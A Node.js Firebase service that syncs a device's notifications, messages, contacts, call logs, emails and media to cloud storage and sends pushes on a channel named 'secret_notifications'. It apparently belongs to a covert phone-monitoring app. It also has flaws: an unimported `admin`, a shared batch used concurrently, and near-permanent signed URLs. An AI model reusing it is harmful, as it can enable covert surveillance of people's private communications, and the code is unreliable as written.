const { db, rtdb, storage, COLLECTIONS, RTDB_PATHS } = require('../config/firebase');

class FirebaseService {
  constructor() {
    this.batch = db.batch();
    this.batchSize = 0;
    this.maxBatchSize = 500;
  }

  // Sync notifications to Firebase
  async syncNotifications(notifications, deviceId) {
    try {
      const promises = notifications.map(async (notification) => {
        const docRef = db.collection(COLLECTIONS.NOTIFICATIONS).doc();
        const notificationData = {
          ...notification,
          deviceId,
          firebaseId: docRef.id,
          syncedAt: new Date(),
          timestamp: new Date(notification.timestamp || Date.now())
        };

        this.batch.set(docRef, notificationData);
        this.batchSize++;

        // Also sync to realtime database for live updates
        await rtdb.ref(`${RTDB_PATHS.LIVE_DATA}/notifications/${deviceId}/${docRef.id}`).set(notificationData);

        if (this.batchSize >= this.maxBatchSize) {
          await this.commitBatch();
        }
      });

      await Promise.all(promises);
      await this.commitBatch();

      // Update sync status
      await this.updateSyncStatus(deviceId, 'notifications', notifications.length);
      
      console.log(`✅ Synced ${notifications.length} notifications to Firebase for device ${deviceId}`);
      return true;
    } catch (error) {
      console.error('❌ Error syncing notifications to Firebase:', error);
      throw error;
    }
  }

  // Sync messages to Firebase
  async syncMessages(messages, deviceId) {
    try {
      const promises = messages.map(async (message) => {
        const docRef = db.collection(COLLECTIONS.MESSAGES).doc();
        const messageData = {
          ...message,
          deviceId,
          firebaseId: docRef.id,
          syncedAt: new Date(),
          timestamp: new Date(message.timestamp || Date.now())
        };

        this.batch.set(docRef, messageData);
        this.batchSize++;

        // Sync to realtime database
        await rtdb.ref(`${RTDB_PATHS.LIVE_DATA}/messages/${deviceId}/${docRef.id}`).set(messageData);

        if (this.batchSize >= this.maxBatchSize) {
          await this.commitBatch();
        }
      });

      await Promise.all(promises);
      await this.commitBatch();

      await this.updateSyncStatus(deviceId, 'messages', messages.length);
      
      console.log(`✅ Synced ${messages.length} messages to Firebase for device ${deviceId}`);
      return true;
    } catch (error) {
      console.error('❌ Error syncing messages to Firebase:', error);
      throw error;
    }
  }

  // Sync contacts to Firebase
  async syncContacts(contacts, deviceId) {
    try {
      const promises = contacts.map(async (contact) => {
        const docRef = db.collection(COLLECTIONS.CONTACTS).doc();
        const contactData = {
          ...contact,
          deviceId,
          firebaseId: docRef.id,
          syncedAt: new Date()
        };

        this.batch.set(docRef, contactData);
        this.batchSize++;

        if (this.batchSize >= this.maxBatchSize) {
          await this.commitBatch();
        }
      });

      await Promise.all(promises);
      await this.commitBatch();

      await this.updateSyncStatus(deviceId, 'contacts', contacts.length);
      
      console.log(`✅ Synced ${contacts.length} contacts to Firebase for device ${deviceId}`);
      return true;
    } catch (error) {
      console.error('❌ Error syncing contacts to Firebase:', error);
      throw error;
    }
  }

  // Sync call logs to Firebase
  async syncCallLogs(callLogs, deviceId) {
    try {
      const promises = callLogs.map(async (callLog) => {
        const docRef = db.collection(COLLECTIONS.CALL_LOGS).doc();
        const callLogData = {
          ...callLog,
          deviceId,
          firebaseId: docRef.id,
          syncedAt: new Date(),
          timestamp: new Date(callLog.timestamp || Date.now())
        };

        this.batch.set(docRef, callLogData);
        this.batchSize++;

        if (this.batchSize >= this.maxBatchSize) {
          await this.commitBatch();
        }
      });

      await Promise.all(promises);
      await this.commitBatch();

      await this.updateSyncStatus(deviceId, 'call_logs', callLogs.length);
      
      console.log(`✅ Synced ${callLogs.length} call logs to Firebase for device ${deviceId}`);
      return true;
    } catch (error) {
      console.error('❌ Error syncing call logs to Firebase:', error);
      throw error;
    }
  }

  // Sync emails to Firebase
  async syncEmails(emails, deviceId) {
    try {
      const promises = emails.map(async (email) => {
        const docRef = db.collection(COLLECTIONS.EMAILS).doc();
        const emailData = {
          ...email,
          deviceId,
          firebaseId: docRef.id,
          syncedAt: new Date(),
          timestamp: new Date(email.timestamp || Date.now())
        };

        this.batch.set(docRef, emailData);
        this.batchSize++;

        if (this.batchSize >= this.maxBatchSize) {
          await this.commitBatch();
        }
      });

      await Promise.all(promises);
      await this.commitBatch();

      await this.updateSyncStatus(deviceId, 'emails', emails.length);
      
      console.log(`✅ Synced ${emails.length} emails to Firebase for device ${deviceId}`);
      return true;
    } catch (error) {
      console.error('❌ Error syncing emails to Firebase:', error);
      throw error;
    }
  }

  // Sync media files to Firebase Storage
  async syncMedia(mediaFiles, deviceId) {
    try {
      const promises = mediaFiles.map(async (mediaFile) => {
        const fileName = `media/${deviceId}/${Date.now()}_${mediaFile.name}`;
        const file = storage.bucket().file(fileName);

        // Upload file to Firebase Storage
        await file.save(mediaFile.buffer, {
          metadata: {
            contentType: mediaFile.mimetype,
            metadata: {
              deviceId,
              originalName: mediaFile.originalname,
              size: mediaFile.size,
              syncedAt: new Date().toISOString()
            }
          }
        });

        // Get download URL
        const [url] = await file.getSignedUrl({
          action: 'read',
          expires: '03-01-2500'
        });

        // Save metadata to Firestore
        const docRef = db.collection(COLLECTIONS.MEDIA).doc();
        const mediaData = {
          deviceId,
          firebaseId: docRef.id,
          fileName,
          downloadUrl: url,
          originalName: mediaFile.originalname,
          size: mediaFile.size,
          mimetype: mediaFile.mimetype,
          syncedAt: new Date()
        };

        this.batch.set(docRef, mediaData);
        this.batchSize++;

        if (this.batchSize >= this.maxBatchSize) {
          await this.commitBatch();
        }
      });

      await Promise.all(promises);
      await this.commitBatch();

      await this.updateSyncStatus(deviceId, 'media', mediaFiles.length);
      
      console.log(`✅ Synced ${mediaFiles.length} media files to Firebase for device ${deviceId}`);
      return true;
    } catch (error) {
      console.error('❌ Error syncing media to Firebase:', error);
      throw error;
    }
  }

  // Update device status in realtime database
  async updateDeviceStatus(deviceId, status) {
    try {
      await rtdb.ref(`${RTDB_PATHS.DEVICE_STATUS}/${deviceId}`).set({
        ...status,
        lastUpdated: new Date().toISOString(),
        isOnline: true
      });
    } catch (error) {
      console.error('❌ Error updating device status:', error);
    }
  }

  // Update sync status
  async updateSyncStatus(deviceId, dataType, count) {
    try {
      await rtdb.ref(`${RTDB_PATHS.SYNC_STATUS}/${deviceId}/${dataType}`).set({
        lastSync: new Date().toISOString(),
        count,
        status: 'success'
      });
    } catch (error) {
      console.error('❌ Error updating sync status:', error);
    }
  }

  // Commit batch operations
  async commitBatch() {
    if (this.batchSize > 0) {
      await this.batch.commit();
      this.batch = db.batch();
      this.batchSize = 0;
    }
  }

  // Get real-time updates for a device
  async getRealTimeUpdates(deviceId) {
    try {
      const snapshot = await rtdb.ref(`${RTDB_PATHS.REAL_TIME_UPDATES}/${deviceId}`).once('value');
      return snapshot.val() || {};
    } catch (error) {
      console.error('❌ Error getting real-time updates:', error);
      return {};
    }
  }

  // Send push notification to device
  async sendPushNotification(deviceToken, notification) {
    try {
      const message = {
        token: deviceToken,
        notification: {
          title: notification.title,
          body: notification.body
        },
        data: notification.data || {},
        android: {
          priority: 'high',
          notification: {
            sound: 'default',
            channelId: 'secret_notifications'
          }
        }
      };

      const response = await admin.messaging().send(message);
      console.log(`✅ Push notification sent: ${response}`);
      return response;
    } catch (error) {
      console.error('❌ Error sending push notification:', error);
      throw error;
    }
  }

  // Get data from Firebase
  async getData(collection, deviceId, limit = 100) {
    try {
      const snapshot = await db.collection(collection)
        .where('deviceId', '==', deviceId)
        .orderBy('syncedAt', 'desc')
        .limit(limit)
        .get();

      return snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
    } catch (error) {
      console.error(`❌ Error getting data from ${collection}:`, error);
      throw error;
    }
  }

  // Delete data from Firebase
  async deleteData(collection, deviceId) {
    try {
      const snapshot = await db.collection(collection)
        .where('deviceId', '==', deviceId)
        .get();

      const batch = db.batch();
      snapshot.docs.forEach(doc => {
        batch.delete(doc.ref);
      });

      await batch.commit();
      console.log(`✅ Deleted data from ${collection} for device ${deviceId}`);
    } catch (error) {
      console.error(`❌ Error deleting data from ${collection}:`, error);
      throw error;
    }
  }
}

module.exports = new FirebaseService(); 